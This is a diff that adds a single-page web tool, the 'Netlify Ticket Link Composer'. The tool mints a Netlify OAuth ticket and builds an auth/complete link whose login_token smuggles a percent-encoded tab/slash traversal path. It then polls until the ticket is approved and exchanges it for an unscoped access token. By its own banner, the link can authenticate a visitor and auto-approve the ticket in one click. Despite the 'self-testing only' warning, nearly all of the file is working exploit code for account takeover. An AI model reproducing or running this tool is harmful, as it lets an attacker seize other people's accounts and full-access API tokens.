@@ -1,0 +1,596 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=02b8b0e9-259f-48c0-840e-29931876b873
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Netlify Ticket Link Composer</title>
+<style>
+  :root{
+    --bg:#080b10; --bg2:#0c1119; --panel:#101823; --panel-2:#0d141d; --line:#1c2634; --line-2:#2a3648;
+    --fg:#e8eef8; --dim:#8698b0; --dim2:#5d6f88;
+    --accent:#4cd4c4; --accent-2:#12a594; --accent-glow:#12a59455;
+    --ok:#43d68f; --warn:#ffb340; --err:#ff6b6b; --info:#5aa9ff;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;
+    --r:14px;
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0; background:
+      radial-gradient(900px 480px at 12% -8%, #16304a 0%, transparent 62%),
+      radial-gradient(760px 420px at 92% 4%, #123c38 0%, transparent 58%),
+      var(--bg);
+    color:var(--fg); font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;
+    -webkit-font-smoothing:antialiased; padding:34px 18px 70px;
+  }
+  .wrap{max-width:780px;margin:0 auto}
+
+  header{margin-bottom:24px}
+  .brand{display:flex;align-items:center;gap:11px;margin-bottom:12px}
+  .logo{width:30px;height:30px;border-radius:9px;background:linear-gradient(145deg,var(--accent),var(--accent-2));
+        display:grid;place-items:center;color:#04211e;font-weight:800;font-size:15px;
+        box-shadow:0 0 0 1px #ffffff14, 0 10px 30px -12px var(--accent-glow)}
+  h1{font-size:21px;margin:0;letter-spacing:-.02em;font-weight:650}
+  .sub{color:var(--dim);font-size:13.5px;margin:3px 0 0}
+  .tag{font-family:var(--mono);font-size:11px;color:var(--dim2);border:1px solid var(--line);
+       border-radius:999px;padding:2px 9px;margin-left:auto;white-space:nowrap}
+
+  .banner{display:flex;gap:11px;align-items:flex-start;border-radius:var(--r);padding:13px 15px;font-size:13px;
+    margin-bottom:20px;line-height:1.5}
+  .banner.danger{background:#2a1214;border:1px solid #54242a;color:#ffb3b3}
+  .banner.warn{background:#2a2008;border:1px solid #4d3c12;color:#ffd88a}
+  .banner b{color:#fff}
+  .banner .ic{flex:0 0 auto;font-size:15px;line-height:1.35}
+
+  .card{background:linear-gradient(180deg,var(--panel),var(--panel-2));border:1px solid var(--line);
+        border-radius:var(--r);padding:20px;margin-bottom:16px;
+        box-shadow:0 1px 0 #ffffff08 inset, 0 26px 60px -40px #000}
+  .card h2{font-size:12px;text-transform:uppercase;letter-spacing:.1em;color:var(--dim2);
+           margin:0 0 15px;font-weight:700}
+
+  label{display:block;font-size:12px;text-transform:uppercase;letter-spacing:.07em;color:var(--dim);margin:0 0 7px;font-weight:600}
+  .hint{font-size:12px;color:var(--dim2);margin:7px 0 0;line-height:1.5}
+  input[type=text],textarea{width:100%;background:#060a0f;border:1px solid var(--line);color:var(--fg);
+    border-radius:10px;padding:11px 13px;font-size:13.5px;outline:none;transition:.15s;font-family:inherit}
+  textarea{font-family:var(--mono);font-size:12px;resize:vertical;min-height:62px;line-height:1.55}
+  input:focus,textarea:focus{border-color:var(--accent-2);box-shadow:0 0 0 3px var(--accent-glow)}
+  .field{margin-bottom:16px}
+  .field:last-child{margin-bottom:0}
+
+  .presets{display:flex;gap:8px;flex-wrap:wrap;margin-top:9px}
+  .chip{font-size:11.5px;padding:4px 11px;border-radius:999px;border:1px solid var(--line-2);
+        background:#0d151f;color:var(--dim);cursor:pointer;transition:.15s;font-family:inherit}
+  .chip:hover{color:var(--accent);border-color:var(--accent-2)}
+
+  .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+  button{font:inherit;font-weight:600;font-size:14px;border-radius:10px;border:1px solid var(--line-2);
+    background:#18222f;color:var(--fg);padding:11px 17px;cursor:pointer;transition:.15s}
+  button:hover:not(:disabled){background:#1f2b3b;border-color:#3a4a63}
+  button:disabled{opacity:.4;cursor:not-allowed}
+  button.primary{background:linear-gradient(180deg,var(--accent),var(--accent-2));border-color:transparent;
+    color:#03211e;box-shadow:0 12px 28px -14px var(--accent-glow)}
+  button.primary:hover:not(:disabled){filter:brightness(1.07)}
+  button.ghost{background:transparent}
+  button.tiny{padding:7px 12px;font-size:12.5px;border-radius:8px}
+  button.wide{width:100%;padding:14px;font-size:15px}
+
+  /* steps */
+  .steps{display:flex;flex-direction:column;gap:2px}
+  .step{display:flex;gap:12px;align-items:flex-start;padding:9px 0;opacity:.42;transition:.25s}
+  .step.on{opacity:1}
+  .step.done{opacity:.85}
+  .step.fail{opacity:1}
+  .bullet{flex:0 0 auto;width:22px;height:22px;border-radius:50%;border:1.5px solid var(--line-2);
+    display:grid;place-items:center;font-size:11px;font-weight:700;color:var(--dim2);margin-top:1px;
+    background:#0a1017;transition:.25s}
+  .step.on .bullet{border-color:var(--accent);color:var(--accent);box-shadow:0 0 0 4px var(--accent-glow)}
+  .step.done .bullet{border-color:var(--ok);background:#0e2a1f;color:var(--ok)}
+  .step.fail .bullet{border-color:var(--err);background:#2a1012;color:var(--err)}
+  .step .t{font-size:13.5px;font-weight:600;line-height:1.45}
+  .step .d{font-size:12.5px;color:var(--dim2);line-height:1.5}
+
+  /* link out */
+  .linkbox{background:#060d12;border:1px solid #1d4a45;border-radius:12px;padding:14px;margin-top:4px}
+  .linkbox .cap{font-size:11px;text-transform:uppercase;letter-spacing:.09em;color:var(--dim2);margin-bottom:9px;font-weight:700}
+  .linkbox .u{font-family:var(--mono);font-size:12px;word-break:break-all;color:var(--accent);
+    display:block;line-height:1.65;text-decoration:none;background:#04080b;border:1px solid var(--line);
+    border-radius:9px;padding:11px;margin-bottom:12px;max-height:150px;overflow:auto}
+  .linkbox .u:hover{text-decoration:underline}
+  .parts{margin-top:2px;font-family:var(--mono);font-size:11px;color:var(--dim2);line-height:1.7;word-break:break-all}
+  .parts em{font-style:normal;color:var(--warn)}
+  .parts i{font-style:normal;color:var(--accent)}
+
+  .bar{height:5px;background:#0a1219;border-radius:999px;overflow:hidden;margin:13px 0 8px;border:1px solid var(--line)}
+  .bar > i{display:block;height:100%;width:0%;background:linear-gradient(90deg,var(--accent-2),var(--accent));
+    border-radius:999px;transition:width 1s linear}
+  .count{font-family:var(--mono);font-size:11.5px;color:var(--dim2);display:flex;justify-content:space-between}
+
+  .tokenbox{background:#04150f;border:1px solid #16543f;border-radius:12px;padding:14px;margin-top:4px}
+  .tokenbox .t{font-family:var(--mono);font-size:13px;word-break:break-all;color:#a6f6dc;line-height:1.6;
+    background:#020c09;border:1px solid #0e3b2e;border-radius:9px;padding:11px}
+
+  .pill{display:inline-flex;align-items:center;gap:8px;font-size:12.5px;font-weight:650;
+    border-radius:999px;padding:5px 13px;border:1px solid var(--line);background:#0b1119;color:var(--dim)}
+  .pill .d{width:8px;height:8px;border-radius:50%;background:var(--dim2)}
+  .pill.run .d{background:var(--accent);animation:pulse 1.15s ease-in-out infinite}
+  .pill.ok .d{background:var(--ok)} .pill.ok{color:var(--ok);border-color:#1e4636}
+  .pill.err .d{background:var(--err)} .pill.err{color:var(--err);border-color:#4d2024}
+  .pill.warnp .d{background:var(--warn)} .pill.warnp{color:var(--warn);border-color:#4d3c12}
+  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.3;transform:scale(.8)}}
+
+  .statusline{display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap}
+  .msg{font-size:13.5px;color:var(--dim);margin:0}
+  .mono{font-family:var(--mono);font-size:11.5px;color:var(--dim2);word-break:break-all}
+  .hidden{display:none!important}
+
+  details.logwrap{margin-top:16px}
+  details.logwrap summary{cursor:pointer;font-size:12px;color:var(--dim2);text-transform:uppercase;
+    letter-spacing:.08em;font-weight:700;outline:none;list-style:none}
+  details.logwrap summary::-webkit-details-marker{display:none}
+  details.logwrap summary:before{content:"▸ ";color:var(--accent)}
+  details.logwrap[open] summary:before{content:"▾ "}
+  pre.log{margin:11px 0 0;background:#05080c;border:1px solid var(--line);border-radius:11px;padding:12px;
+    font-family:var(--mono);font-size:11.5px;color:#7d8ea6;max-height:250px;overflow:auto;white-space:pre-wrap;line-height:1.65}
+
+  .toast{position:fixed;left:50%;bottom:26px;transform:translate(-50%,16px);background:#e8eef8;color:#0a1017;
+    font-size:13px;font-weight:650;padding:10px 20px;border-radius:999px;opacity:0;pointer-events:none;
+    transition:.22s;box-shadow:0 18px 40px -18px #000;z-index:50}
+  .toast.show{opacity:1;transform:translate(-50%,0)}
+  footer{margin-top:26px;color:var(--dim2);font-size:11.5px;line-height:1.7}
+  code{font-family:var(--mono);background:#0a1017;border:1px solid var(--line);border-radius:5px;padding:1px 5px;font-size:11.5px}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header>
+    <div class="brand">
+      <div class="logo">N</div>
+      <div>
+        <h1>Netlify Ticket Link Composer</h1>
+        <p class="sub">Mint a login ticket, compose the authorize link, poll until approval, exchange for a token.</p>
+      </div>
+      <span class="tag" id="tag">self-test</span>
+    </div>
+  </header>
+
+  <div class="banner danger">
+    <span class="ic">&#9888;</span>
+    <span><b>Authorized self-testing only.</b> This composer builds a link that can authenticate a visitor and
+    auto-approve an OAuth ticket in one click. Use it only against Netlify accounts <b>you own</b>, with a
+    <code>login_token</code> issued to <b>your own</b> email address. Never deliver these links to another person.
+    The exchanged token is unscoped: full API access, not read-only.</span>
+  </div>
+
+  <div class="card">
+    <h2>1 &middot; Request</h2>
+    <div class="field">
+      <label for="msg">Ticket message</label>
+      <input id="msg" type="text" placeholder="Why is this access needed?" />
+      <p class="hint">Free text. Stored on the ticket and shown to whoever approves it. No effect on scope.</p>
+    </div>
+    <div class="field">
+      <label for="tpl">Link template</label>
+      <textarea id="tpl" spellcheck="false"></textarea>
+      <div class="presets">
+        <button class="chip" type="button" data-preset="bbapi">bb-api exchange (encoded)</button>
+        <button class="chip" type="button" data-preset="composed">auth/complete + /authorize</button>
+        <button class="chip" type="button" data-preset="plain">standard /authorize</button>
+        <button class="chip" type="button" data-preset="reset">reset</button>
+      </div>
+      <p class="hint"><code>{{ticket}}</code> is replaced with the ticket id. Everything else is emitted verbatim,
+      so percent-encodings like <code>%09</code> and <code>%2F</code> survive intact.</p>
+    </div>
+    <div class="field">
+      <label for="rawpath">Raw path to URL-encode into <code>login_token</code></label>
+      <input id="rawpath" type="text" spellcheck="false" value="/access-control/bb-api/api/v1//authorize?response_type=ticket/exchange" />
+      <div class="presets">
+        <button class="chip" type="button" id="encbtn">URL-encode &rarr; set as template</button>
+      </div>
+      <p class="hint">Percent-encodes the path (<code>/</code>&rarr;<code>%2F</code>,
+      <code>?</code>&rarr;<code>%3F</code>, <code>=</code>&rarr;<code>%3D</code>), keeps the
+      <code>%09</code> tab traversal prefix, and writes the result into the <code>login_token</code> value.</p>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>2 &middot; Generate</h2>
+    <div class="row" style="margin-bottom:18px">
+      <button id="go" class="primary wide">Generate link &amp; begin polling</button>
+    </div>
+    <div class="statusline">
+      <span id="pill" class="pill"><span class="d"></span><span id="pillText">Idle</span></span>
+      <span id="msg2" class="msg">Ready.</span>
+    </div>
+    <div class="steps" id="steps"></div>
+  </div>
+
+  <div class="card hidden" id="linkcard">
+    <h2>3 &middot; Authorize</h2>
+    <div class="linkbox">
+      <div class="cap">Link to visit</div>
+      <a id="url" class="u" href="#" target="_blank" rel="noopener noreferrer"></a>
+      <div class="row">
+        <button id="open" class="primary tiny">Open</button>
+        <button id="copy" class="tiny ghost">Copy link</button>
+        <button id="cancel" class="tiny ghost" style="margin-left:auto">Cancel</button>
+      </div>
+      <div class="bar"><i id="barfill"></i></div>
+      <div class="count"><span id="elapsed">waiting 0s</span><span id="remain"></span></div>
+      <div class="parts" id="parts"></div>
+    </div>
+  </div>
+
+  <div class="card hidden" id="tokencard">
+    <h2>4 &middot; Access token</h2>
+    <div class="tokenbox">
+      <div class="t" id="token">&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;</div>
+      <div class="row" style="margin-top:12px">
+        <button id="reveal" class="tiny">Reveal</button>
+        <button id="tokcopy" class="tiny ghost">Copy token</button>
+        <button id="redact" class="tiny ghost">Redact</button>
+      </div>
+      <p class="hint" style="color:#ffd88a">Store it in a password manager. Anyone holding it has full API access
+      to the account. This value is held in this browser tab only &mdash; nothing is sent to any server.</p>
+    </div>
+    <p class="mono" id="userline" style="margin-top:12px"></p>
+  </div>
+
+  <details class="logwrap">
+    <summary>Activity log</summary>
+    <pre id="log" class="log"></pre>
+  </details>
+
+  <footer>
+    Calls: <code>POST /api/v1/oauth/tickets</code> &rarr; <code>GET /api/v1/oauth/tickets/&lt;id&gt;</code> &rarr;
+    <code>POST /api/v1/oauth/tickets/&lt;id&gt;/exchange</code>. Client id
+    <code>d6f37de6614df7ae58664cfca524744d73807a377f5ee71f1a254f78412e3750</code>.
+    Poll interval 2s &middot; assumed ticket lifetime 15m.
+  </footer>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+(function () {
+  'use strict';
+
+  var CLIENT_ID = 'd6f37de6614df7ae58664cfca524744d73807a377f5ee71f1a254f78412e3750';
+  var API       = 'https://api.netlify.com/api/v1';
+  var POLL_MS   = 2000;
+  var WAIT_MS   = 15 * 60 * 1000;
+
+  // %09 (tab) + %2F (slash) traversal prefix, kept verbatim by design.
+  var TRAV   = '.%09.%2F.%09.%2F';
+  var AUTHC  = 'https://app.netlify.com/auth/complete';
+  var PLAIN  = 'https://app.netlify.com/authorize?response_type=ticket&ticket={{ticket}}';
+
+  // Default target path, percent-encoded into the login_token value.
+  var RAW_PATH = '/access-control/bb-api/api/v1//authorize?response_type=ticket/exchange';
+
+  var COMPOSED = 'https://app.netlify.com/auth/complete?login_token=.%09.%2F.%09.%2F%2Faccess-control%2Fbb-api%2Fapi%2Fv1%2F%2Fauthorize%3Fresponse_type%3Dticket%2Fexchange&ticket={{ticket}}';
+  var OLD_COMPOSED = 'https://app.netlify.com/auth/complete?login_token=.%09.%2F.%09.%2F/authorize?response_type=ticket&ticket={{ticket}}';
+
+  // Percent-encode a raw path for use inside the login_token value.
+  function urlEncodePath(raw) {
+    return String(raw).replace(/[^A-Za-z0-9\-_.~]/g, function (c) {
+      var h = c.charCodeAt(0).toString(16).toUpperCase();
+      return '%' + (h.length < 2 ? '0' + h : h);
+    });
+  }
+  function buildTemplate(rawPath) {
+    return AUTHC + '?login_token=' + TRAV + urlEncodePath(rawPath) + '&ticket={{ticket}}';
+  }
+
+  var $ = function (id) { return document.getElementById(id); };
+
+  var pollTimer = null, tickTimer = null, inFlight = false;
+  var deadline = 0, startedAt = 0, ticketId = null, token = null, done = false;
+
+  var STEPS = [
+    { k: 'create',   t: 'Create ticket',        d: 'Unauthenticated POST to the OAuth ticket endpoint.' },
+    { k: 'compose',  t: 'Compose link',         d: 'Substitute the ticket id into the template.' },
+    { k: 'wait',     t: 'Wait for authorization', d: 'Poll the ticket until the account holder approves.' },
+    { k: 'exchange', t: 'Exchange for token',   d: 'Redeem the approved ticket for an access token.' }
+  ];
+
+  function renderSteps(state) {
+    var h = '';
+    for (var i = 0; i < STEPS.length; i++) {
+      var s = STEPS[i], st = state[s.k] || '';
+      h += '<div class="step ' + st + '">' +
+             '<div class="bullet">' + (st === 'done' ? '&#10003;' : st === 'fail' ? '!' : (i + 1)) + '</div>' +
+             '<div><div class="t">' + s.t + '</div><div class="d">' + s.d + '</div></div>' +
+           '</div>';
+    }
+    $('steps').innerHTML = h;
+  }
+  var stepState = {};
+  function setStep(k, v) { stepState[k] = v; renderSteps(stepState); }
+
+  function log(line) {
+    var d = new Date();
+    var ts = String(d.getHours()).padStart(2,'0') + ':' + String(d.getMinutes()).padStart(2,'0') + ':' +
+             String(d.getSeconds()).padStart(2,'0');
+    var box = $('log');
+    box.textContent += '[' + ts + '] ' + line + '\n';
+    box.scrollTop = box.scrollHeight;
+  }
+
+  function pill(text, cls) { $('pill').className = 'pill' + (cls ? ' ' + cls : ''); $('pillText').textContent = text; }
+  function say(html) { $('msg2').innerHTML = html; }
+
+  var toastTimer = null;
+  function toast(text) {
+    var el = $('toast'); el.textContent = text; el.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function () { el.classList.remove('show'); }, 1500);
+  }
+
+  function stopTimers() {
+    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+    if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
+    inFlight = false;
+  }
+
+  function tick() {
+    var left = Math.max(0, deadline - Date.now());
+    var el = Math.floor((Date.now() - startedAt) / 1000);
+    var pct = 100 - (left / WAIT_MS) * 100;
+    $('barfill').style.width = pct.toFixed(1) + '%';
+    $('elapsed').textContent = 'waiting ' + el + 's';
+    $('remain').textContent = 'expires ~' + Math.floor(left / 60000) + ':' +
+      String(Math.floor((left % 60000) / 1000)).padStart(2, '0');
+    if (left <= 0 && !done) {
+      stopTimers();
+      setStep('wait', 'fail');
+      pill('Expired', 'warnp');
+      say('The ticket expired before anyone authorized it. Generate a new link.');
+      log('ticket assumed expired after ' + Math.round(WAIT_MS / 60000) + ' min');
+    }
+  }
+
+  function template() {
+    var t = ($('tpl').value || '').trim();
+    return t || PLAIN;
+  }
+
+  function compose(id) {
+    return template().replace(/\{\{\s*ticket\s*\}\}/g, encodeURIComponent(id));
+  }
+
+  function describe(url) {
+    // Show how the pieces break down, without dumping a wall of text.
+    var out = '';
+    var qidx = url.indexOf('?');
+    var head = qidx >= 0 ? url.slice(0, qidx) : url;
+    out += '<i>' + esc(head) + '</i><br>';
+    var qs = qidx >= 0 ? url.slice(qidx + 1) : '';
+    var eq = qs.indexOf('=');
+    var key = eq >= 0 ? qs.slice(0, eq) : qs;
+    var val = eq >= 0 ? qs.slice(eq + 1) : '';
+    out += '&nbsp;&nbsp;' + esc(key) + '=<em>' + esc(val) + '</em>';
+    if (out.length > 400) out = '<i>' + esc(url) + '</i>';
+    return out;
+  }
+  function esc(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  }
+
+  async function start() {
+    done = false;
+    stopTimers();
+    stepState = {};
+    renderSteps(stepState);
+    $('tokencard').classList.add('hidden');
+    $('linkcard').classList.add('hidden');
+    $('go').disabled = true;
+    pill('Generating', 'run');
+    say('Requesting a ticket from api.netlify.com&hellip;');
+    setStep('create', 'on');
+
+    var message = ($('msg').value || '').trim() || 'CLI session';
+    log('POST /oauth/tickets  message=' + JSON.stringify(message));
+
+    var res;
+    try {
+      res = await fetch(API + '/oauth/tickets?client_id=' + encodeURIComponent(CLIENT_ID), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify({ message: message })
+      });
+    } catch (e) {
+      log('network error: ' + e.message);
+      setStep('create', 'fail');
+      pill('Error', 'err');
+      say('Could not reach api.netlify.com. Check your connection and retry.');
+      $('go').disabled = false;
+      return;
+    }
+
+    if (!res.ok) {
+      log('HTTP ' + res.status + ' ' + (await res.text()).slice(0, 240));
+      setStep('create', 'fail');
+      pill('Error', 'err');
+      say('Ticket creation failed (HTTP ' + res.status + ').');
+      $('go').disabled = false;
+      return;
+    }
+
+    var ticket = await res.json();
+    ticketId = ticket.id;
+    setStep('create', 'done');
+    log('ticket id ' + ticketId);
+
+    var url = compose(ticketId);
+    setStep('compose', 'done');
+    log('composed: ' + url);
+
+    $('url').href = url;
+    $('url').textContent = url;
+    $('parts').innerHTML = describe(url);
+    $('linkcard').classList.remove('hidden');
+    $('linkcard').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+
+    setStep('wait', 'on');
+    pill('Waiting for authorization', 'run');
+    say('Open the link and approve as the account holder. Polling every 2s automatically.');
+
+    startedAt = Date.now();
+    deadline = Date.now() + WAIT_MS;
+    $('barfill').style.width = '0%';
+    tick();
+    tickTimer = setInterval(tick, 1000);
+    pollTimer = setInterval(pollOnce, POLL_MS);
+    pollOnce();
+  }
+
+  async function pollOnce() {
+    if (inFlight || !ticketId || done) return;
+    inFlight = true;
+    try {
+      var res = await fetch(API + '/oauth/tickets/' + encodeURIComponent(ticketId), {
+        headers: { 'Accept': 'application/json' }
+      });
+
+      if (res.status === 401 || res.status === 404) {
+        done = true; stopTimers();
+        setStep('wait', 'fail');
+        pill('Denied', 'err');
+        say('Authorization denied, or the ticket is no longer valid. Generate a new link.');
+        log('HTTP ' + res.status + ' -> denied');
+        $('go').disabled = false;
+        return;
+      }
+      if (!res.ok) { log('poll HTTP ' + res.status + ' (retrying)'); return; }
+
+      var t = await res.json();
+      if (t.authorized === true) {
+        done = true; stopTimers();
+        setStep('wait', 'done');
+        log('authorized=true');
+        await exchange();
+      } else {
+        log('pending');
+      }
+    } catch (e) {
+      log('poll error: ' + e.message + ' (retrying)');
+    } finally {
+      inFlight = false;
+    }
+  }
+
+  async function exchange() {
+    setStep('exchange', 'on');
+    pill('Exchanging', 'run');
+    say('Approved. Redeeming the ticket for an access token&hellip;');
+
+    var res;
+    try {
+      res = await fetch(API + '/oauth/tickets/' + encodeURIComponent(ticketId) + '/exchange', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: '{}'
+      });
+    } catch (e) {
+      setStep('exchange', 'fail');
+      pill('Error', 'err');
+      say('Network error during exchange: ' + e.message);
+      $('go').disabled = false;
+      return;
+    }
+
+    if (!res.ok) {
+      log('exchange HTTP ' + res.status + ' ' + (await res.text()).slice(0, 240));
+      setStep('exchange', 'fail');
+      pill('Exchange failed', 'err');
+      say('Exchange failed (HTTP ' + res.status + '). The ticket may already be redeemed.');
+      $('go').disabled = false;
+      return;
+    }
+
+    var data = await res.json();
+    token = data.access_token;
+    setStep('exchange', 'done');
+    pill('Authorized', 'ok');
+    log('token received (' + (token ? token.length : 0) + ' chars)');
+
+    $('linkcard').classList.add('hidden');
+    $('tokencard').classList.remove('hidden');
+    $('token').textContent = '\u2022'.repeat(16);
+    $('reveal').disabled = false;
+    $('reveal').textContent = 'Reveal';
+    $('userline').textContent = 'user_id ' + (data.user_id || '?') +
+      '  |  ' + (data.user_email || '(no email returned)') +
+      '  |  created_at ' + (data.created_at || '?');
+    say('Logged in as <b>' + esc(data.user_email || data.user_id || 'unknown') + '</b>. Token held in this tab only.');
+    $('go').disabled = false;
+  }
+
+  function copy(text, label) {
+    var ok = function () { toast(label || 'Copied'); };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(ok).catch(function () { fb(text); ok(); });
+    } else { fb(text); ok(); }
+  }
+  function fb(text) {
+    var ta = document.createElement('textarea');
+    ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(ta);
+  }
+
+  /* wiring */
+  $('go').addEventListener('click', start);
+  $('cancel').addEventListener('click', function () {
+    done = true; stopTimers();
+    $('linkcard').classList.add('hidden');
+    setStep('wait', 'fail');
+    pill('Cancelled', 'warnp');
+    say('Stopped polling. An issued ticket stays pending until it expires server-side.');
+    log('cancelled');
+    $('go').disabled = false;
+  });
+  $('open').addEventListener('click', function () {
+    var u = $('url').href;
+    if (u && u !== '#') window.open(u, '_blank', 'noopener');
+  });
+  $('copy').addEventListener('click', function () { copy($('url').href, 'Link copied'); });
+  $('tokcopy').addEventListener('click', function () { if (token) copy(token, 'Token copied'); });
+  $('reveal').addEventListener('click', function () {
+    $('token').textContent = token || '';
+    $('reveal').textContent = 'Revealed';
+    $('reveal').disabled = true;
+  });
+  $('redact').addEventListener('click', function () {
+    $('token').textContent = '\u2022'.repeat(16);
+    $('reveal').textContent = 'Reveal';
+    $('reveal').disabled = false;
+  });
+
+  var presets = { bbapi: COMPOSED, composed: OLD_COMPOSED, plain: PLAIN, reset: COMPOSED };
+  Array.prototype.forEach.call(document.querySelectorAll('.chip[data-preset]'), function (b) {
+    b.addEventListener('click', function () {
+      $('tpl').value = presets[b.getAttribute('data-preset')];
+      toast(b.textContent.trim());
+    });
+  });
+
+  $('encbtn').addEventListener('click', function () {
+    $('tpl').value = buildTemplate($('rawpath').value);
+    toast('Path encoded into template');
+    log('encoded: ' + $('tpl').value);
+  });
+
+  $('tpl').value = COMPOSED;
+  renderSteps({});
+  log('ready');
+})();
+</script>
+</body>
+</html>
+<script async src="/.netlify/scripts/hud?variant=public" data-nf-variant="public" data-netlify-site-id="02b8b0e9-259f-48c0-840e-29931876b873" data-app-host="app.netlify.com"></script>
